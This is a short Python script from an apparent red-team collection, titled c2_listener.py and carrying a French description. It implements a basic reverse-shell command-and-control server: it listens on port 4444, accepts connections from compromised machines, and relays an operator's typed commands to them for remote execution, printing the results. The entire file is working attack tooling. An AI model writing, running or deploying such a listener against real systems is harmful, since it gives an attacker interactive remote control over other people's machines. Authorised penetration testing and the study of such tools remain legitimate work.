#!/usr/bin/env python3
'''''
=====================================================================================================================================================
   
 /$$$$$$$                  /$$ /$$$$$$$$                                         /$$$$$$                      /$$             /$$             
| $$__  $$                | $$|__  $$__/                                        /$$__  $$                    |__/            | $$             
| $$  \ $$  /$$$$$$   /$$$$$$$   | $$  /$$$$$$   /$$$$$$  /$$$$$$/$$$$         | $$  \__/  /$$$$$$$  /$$$$$$  /$$  /$$$$$$  /$$$$$$   /$$$$$$$
| $$$$$$$/ /$$__  $$ /$$__  $$   | $$ /$$__  $$ |____  $$| $$_  $$_  $$ /$$$$$$|  $$$$$$  /$$_____/ /$$__  $$| $$ /$$__  $$|_  $$_/  /$$_____/
| $$__  $$| $$$$$$$$| $$  | $$   | $$| $$$$$$$$  /$$$$$$$| $$ \ $$ \ $$|______/ \____  $$| $$      | $$  \__/| $$| $$  \ $$  | $$   |  $$$$$$ 
| $$  \ $$| $$_____/| $$  | $$   | $$| $$_____/ /$$__  $$| $$ | $$ | $$         /$$  \ $$| $$      | $$      | $$| $$  | $$  | $$ /$$\____  $$
| $$  | $$|  $$$$$$$|  $$$$$$$   | $$|  $$$$$$$|  $$$$$$$| $$ | $$ | $$        |  $$$$$$/|  $$$$$$$| $$      | $$| $$$$$$$/  |  $$$$//$$$$$$$/ 
|__/  |__/ \_______/ \_______/   |__/ \_______/ \_______/|__/ |__/ |__/         \______/  \_______/|__/      |__/| $$____/    \___/ |_______/ 
                                                                                                                 | $$                         
                                                                                                                 | $$                         
                                                                                                                 |__/                         
=====================================================================================================================================================
=====================================================================================================================================================
Script     : c2_listener.py
Auteur     : Lysius
Date       : XX/XX/XXXX
Description: Implémente un serveur d’écoute de type « reverse shell » basique. Il attend des connexions entrantes sur le port 4444, puis permet à l’opérateur d’exécuter des commandes à distance sur la machine cliente connectée.
=====================================================================================================================================================
'''''
import socket, threading

HOST = '0.0.0.0'
PORT = 4444

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    while True:
        cmd = input("shell> ")
        if cmd.strip() == 'exit':
            conn.close()
            break
        conn.send(cmd.encode() + b'\n')
        data = conn.recv(4096)
        print(data.decode())

def start_server():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == '__main__':
    start_server()
